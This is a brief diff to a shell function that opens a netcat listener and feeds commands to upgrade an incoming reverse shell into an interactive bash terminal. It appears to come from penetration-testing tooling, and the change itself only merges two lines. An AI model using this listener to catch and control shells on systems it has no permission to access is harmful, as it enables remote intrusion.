@@ -147,8 +147,7 @@ shell() {
     python3 -c "import pty;pty.spawn(\"/bin/bash\")" 2>/dev/null || \
     script -qc /bin/bash /dev/null 2>/dev/null';
     echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; 
-    echo reset;
-    cat) | nc -lvnp $port && reset
+    echo reset; cat) | nc -lvnp $port && reset
 }
 
 
